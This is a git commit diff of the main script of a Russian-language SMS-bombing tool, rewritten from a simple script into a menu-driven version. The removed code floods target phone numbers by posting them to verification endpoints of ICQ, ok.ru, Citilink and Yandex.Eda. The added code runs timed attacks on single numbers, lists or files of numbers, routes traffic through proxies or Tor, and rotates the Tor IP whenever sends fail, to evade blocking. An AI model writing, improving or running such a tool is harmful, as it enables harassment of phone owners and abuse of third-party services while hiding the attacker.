f2f620ee40a55c02236a40e6e5dfb82955985cd9
Romidorka <artemvasnev01@gmail.com>
2021-09-25 13:52:41 +0600

    v2.0

--- main.py
+++ main.py
@@ -1,127 +1,260 @@
-import requests, module, argparse, time, os
-from module import clr
-phones = []
-messagesSend = 0
-fileName = ""
-timer = int(time.time())
-startTime = time.time()
+from stem import Signal
+from stem.control import Controller
+from typing import List
+import colorama as clr
+import requests
+import json
+import time
+import os
+import module
+import attck_funcs
 
-parser = argparse.ArgumentParser(description="Script for mass phone numbers ddos")
-parser.add_argument('--phone', type=str, help="Path to file with phone numbers")
-args = parser.parse_args()
 
-headers={
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
-}
-
-if args.phone != None:
-    fileName = args.phone
-
-def logo():
-    print(clr.Fore.MAGENTA + module.logo)
-    print(clr.Fore.RED + module.author)
-    print(clr.Fore.CYAN + "\n" * 2)
-
-def clearScrean():
+def clear_screen():
     if os.name == "nt":
         os.system("cls")
     else:
         os.system("clear")
 
-def attack():
-    global timeAttack
-    global startTime
-    global messagesSend
-    startTime = time.time()
-    clearScrean()
-    print(clr.Fore.MAGENTA + module.attackLogo + "\n")
-    while time.time() < startTime + timeAttack:
-        for _phone in phones:
-            if _phone == "":
+
+class Main:
+    proxy = {}
+
+    def __init__(self):
+        self.session = requests.session()
+        with open("settings.json") as file:
+            self.settings = json.loads(file.read())
+        self.refresh_proxy()
+
+    def logo(self):
+        clear_screen()
+        print(module.logo)
+
+    def main_menu(self):
+        while True:
+            self.logo()
+            print(module.main_menu)
+            cmd = input(" >")
+            if cmd == "1":
+                self.attack_menu()
+                # print("Attack menu")
+            elif cmd == "2":
+                self.proxy_menu()
+            elif cmd == "0":
+                clear_screen()
+                quit()
+            else:
+                print(clr.Fore.RED + " Некоректный ввод." + clr.Fore.BLUE)
+                time.sleep(1.25)
+
+    def attack_menu(self):
+        while True:
+            self.logo()
+            print(module.attack_menu)
+            cmd = input(" >")
+            if cmd == "1":
+                self.logo()
+                phones = [input(" Введите номер: ").replace(" ", "")]
+                raw_time = input(" Введите время атаки(мин:сек): ").split(":")
+                time_ = int(raw_time[0]) * 60 + int(raw_time[1])
+
+                # Attack
+                print("\n Номер телефона для атаки:")
+                print(" [1]: " + phones[0])
+                answer = input("\n" + " Вы хотите запустить атаку? (1 - Да, 2 - По таймеру, 3 - Нет): ")
+
+                if answer == "1":
+                    self.attack(phones, time_)
+                elif answer == "2":
+                    wait_time_raw = input("\n Через сколько запустить спам (мин:секунды): ").split(":")
+                    wait_time = int(wait_time_raw[0]) * 60 + int(wait_time_raw[1])
+
+                    timer = int(time.time())
+                    last_val = int(time.time()) - timer
+
+                    print("")
+                    while int(time.time()) - timer < wait_time:
+                        if last_val != int(time.time()) - timer:
+                            last_val = int(time.time()) - timer
+                            print(" Осталось: " + str(wait_time - last_val))
+                    self.attack(phones, time_)
+                elif answer == "3":
+                    pass
+                else:
+                    print(clr.Fore.RED + " Некоректный ввод." + clr.Fore.BLUE)
+                    time.sleep(1.25)
+
+            elif cmd == "2":
+                self.logo()
+                raw_phones = input(" Введите номера(через пробел): ").split(" ")
+                phones: List[str] = []
+                for phone in raw_phones:
+                    phone = phone.replace(" ", "")
+                    if phone != "":
+                        phones.append(phone)
+
+                raw_time = input(" Введите время атаки(мин:сек): ").split(":")
+                time_ = int(raw_time[0]) * 60 + int(raw_time[1])
+
+                # Attack
+                print("\n Номера телефонов для атаки:")
+                for i in range(len(phones)):
+                    print(" [" + str(i + 1) + "]: " + phones[i])
+                answer = input("\n" + " Вы хотите запустить атаку? (1 - Да, 2 - По таймеру, 3 - Нет): ")
+                if answer == "1":
+                    self.attack(phones, time_)
+                elif answer == "2":
+                    wait_time_raw = input("\n Через сколько запустить спам (мин:секунды): ").split(":")
+                    wait_time = int(wait_time_raw[0]) * 60 + int(wait_time_raw[1])
+
+                    timer = int(time.time())
+                    last_val = int(time.time()) - timer
+
+                    print("")
+                    while int(time.time()) - timer < wait_time:
+                        if last_val != int(time.time()) - timer:
+                            last_val = int(time.time()) - timer
+                            print(" Осталось: " + str(wait_time - last_val))
+                    self.attack(phones, time_)
+            elif cmd == "3":
+                self.logo()
+                phones: List[str] = []
+
+                while True:
+                    file_path = input(" Введите путь к файлу: ")
+                    try:
+                        with open(file_path, "r") as file:
+                            raw_phones = file.read().split("\n")
+                        break
+                    except FileNotFoundError or FileExistsError:
+                        print(clr.Fore.RED + " Файл не существует или не найден." + clr.Fore.BLUE)
+                        time.sleep(1.25)
+
+                for phone in raw_phones:
+                    phone = phone.replace(" ", "")
+                    if phone != "":
+                        phones.append(phone)
+
+                raw_time = input(" Введите время атаки(мин:сек): ").split(":")
+                time_ = int(raw_time[0]) * 60 + int(raw_time[1])
+
+                # Attack
+                print("\n Номера телефонов для атаки:")
+                for i in range(len(phones)):
+                    print(" [" + str(i + 1) + "]: " + phones[i])
+
+                answer = input("\n" + " Вы хотите запустить атаку? (1 - Да, 2 - По таймеру, 3 - Нет): ")
+                if answer == "1":
+                    self.attack(phones, time_)
+                elif answer == "2":
+                    wait_time_raw = input("\n Через сколько запустить спам (мин:секунды): ").split(":")
+                    wait_time = int(wait_time_raw[0]) * 60 + int(wait_time_raw[1])
+
+                    timer = int(time.time())
+                    last_val = int(time.time()) - timer
+
+                    print("")
+                    while int(time.time()) - timer < wait_time:
+                        if last_val != int(time.time()) - timer:
+                            last_val = int(time.time()) - timer
+                            print(" Осталось: " + str(wait_time - last_val))
+                    self.attack(phones, time_)
+
+            elif cmd == "0":
+                break
+            else:
+                print(clr.Fore.RED + " Некоректный ввод." + clr.Fore.BLUE)
+                time.sleep(1.25)
                 continue
-            try:
-                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
-                              data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
-                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=headers)
-                messagesSend += 1
-                print(f"[{messagesSend}] ICQ отправлен")
-            except:
-                print("ICQ не отправлен")
 
-            try:
-                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                              data={"st.r.phone": "+" + _phone}, headers=headers)
-                messagesSend += 1
-                print(f"[{messagesSend}] OK отправлен")
-            except:
-                print("OK не отправлен")
+    def proxy_menu(self):
+        while True:
+            self.logo()
+            selected_symbol = clr.Fore.LIGHTBLUE_EX + "+" + clr.Fore.CYAN
+            proxy_arr = [" ", " ", " ", " "]
+            if self.settings['proxy'] == "noproxy":
+                proxy_arr[0] = selected_symbol
+            elif self.settings['proxy'] == "proxy":
+                proxy_arr[1] = selected_symbol
+            elif self.settings['proxy'] == "tor":
+                proxy_arr[2] = selected_symbol
+            elif self.settings['proxy'] == "toripcng":
+                proxy_arr[3] = selected_symbol
+            print(module.proxy_menu.format(proxy_arr[0],
+                                           proxy_arr[1],
+                                           proxy_arr[2],
+                                           proxy_arr[3]))
 
-            try:
-                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/', headers=headers)
-                messagesSend += 1
-                print(f"[{messagesSend}] Citilink отправлен")
-            except:
-                print("Citilink не отправлен")
+            cmd = input(" >")
+            if cmd == "1":
+                self.settings['proxy'] = "noproxy"
+            elif cmd == "2":
+                proxy = input("\n Введите прокси (ip:port): ")
+                self.settings['proxy'] = "proxy"
+                self.settings['custom_proxy'] = "https://" + proxy
+            elif cmd == "3":
+                self.settings['proxy'] = "tor"
+            elif cmd == "4":
+                self.settings['proxy'] = "toripcng"
+            elif cmd == "0":
+                break
+            else:
+                print(clr.Fore.RED + " Некоректный ввод." + clr.Fore.BLUE)
+                time.sleep(1.25)
+                continue
 
-            try:
-                requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + _phone}, headers=headers)
-                messagesSend += 1
-                print(f"[{messagesSend}] Yandex.Eda отправлен")
-            except:
-                print("Yandex.Eda не отправлен")
-            time.sleep(2)
+            with open("settings.json", "w") as file:
+                json.dump(self.settings, file)
+            self.refresh_proxy()
+
+    def new_ip(self):
+        # signal TOR for a new connection
+        with Controller.from_port(port=9051) as controller:
+            controller.authenticate(password="password")
+            controller.signal(Signal.NEWNYM)
+
+    def refresh_proxy(self):
+        if self.settings['proxy'] == "noproxy":
+            self.proxy = {}
+        elif self.settings['proxy'] == "proxy":
+            self.proxy = {'https': self.settings['custom_proxy']}
+        elif self.settings['proxy'] == "tor" or self.settings['proxy'] == "toripcng":
+            self.proxy = {'http':  'socks5://127.0.0.1:9050',
+                          'https': 'socks5://127.0.0.1:9050'}
+
+    def attack(self, phones: List[str], time_: int = 30):
+        clear_screen()
+        print(module.attack_logo + "\n\n")
+        timer = time.time()
+        try:
+            while time.time() - timer < time_:
+                for phone in phones:
+                    error = False
+                    print(clr.Fore.LIGHTBLUE_EX + f"\n {phone}:" + clr.Fore.CYAN)
+                    for service in attck_funcs.functions:
+                        name = attck_funcs.names[attck_funcs.functions.index(service)]
+                        resp = service(phone, self.proxy)
+                        if resp == "ok":
+                            print(clr.Fore.LIGHTGREEN_EX + " [" + name + "] Сообщение отправленно." + clr.Fore.CYAN)
+                        elif resp == "error":
+                            print(clr.Fore.LIGHTRED_EX + " [" + name + "] Сообщение не отправленно." + clr.Fore.CYAN)
+                            error = True
+
+                    if error and self.settings["proxy"] == "toripcng":
+                        print("\a\n\n Changing ip")
+                        old_ip = json.loads(requests.get("http://httpbin.org/ip", proxies=self.proxy).content)["origin"]
+                        print(" Old ip: " + old_ip)
+                        self.new_ip()
+                        new_ip = json.loads(requests.get("http://httpbin.org/ip", proxies=self.proxy).content)["origin"]
+                        print(" New ip: " + new_ip)
+        except KeyboardInterrupt:
+            print("\a\n\n Атака остановленна.")
+            time.sleep(2.5)
+        except Exception as E:
+            print(E)
+            time.sleep(12.5)
 
 
-clearScrean()
-logo()
-
-print(clr.Fore.CYAN + module.choice)
-
-mode = input("Выберите режим: ")
-if mode == "1":
-    clearScrean()
-    logo()
-    phones = [input("Введите номер телефона: ")]
-elif mode == "2":
-    clearScrean()
-    logo()
-    phones = input("Введите номера: ").split(" ")
-elif mode == "3":
-    clearScrean()
-    logo()
-    if fileName == "":
-        fileName = input("Введите название файла: ")
-    with open(fileName, "r") as file:
-        phones = file.read().split("\n")
-elif mode == "4":
-    quit()
-
-for i in range(phones.count("")):
-    phones.remove("")
-
-print("\nНомера телефонов для атаки:")
-for i in range(len(phones)):
-    print("[" + str(i+1) + "]: " + phones[i])
-
-timeAttack = int(input("\n" + clr.Fore.RED + "Введи время атаки (в секундах): "))
-
-answ = input("\n" + clr.Fore.RED + "Вы хотите запустить атаку? (1 - Да, 2 - По таймеру, 3 - Нет): ")
-if answ == "1":
-    attack()
-elif answ == "2":
-    waitTimeRaw = input("\nЧерез сколько запустить спам (мин:секунды): ").split(":")
-    waitTime = int(waitTimeRaw[0]) * 60 + int(waitTimeRaw[1])
-
-    timer = int(time.time())
-    lastval = int(time.time()) - timer
-    clearScrean()
-    logo()
-
-    while int(time.time()) - timer < waitTime:
-        # print(time.time() - timer)
-        if lastval != int(time.time()) - timer:
-            lastval = int(time.time()) - timer
-            print("Осталось: " + str(waitTime - lastval))
-    attack()
-elif answ == "3":
-    quit()
+if __name__ == '__main__':
+    app = Main()
+    app.main_menu()
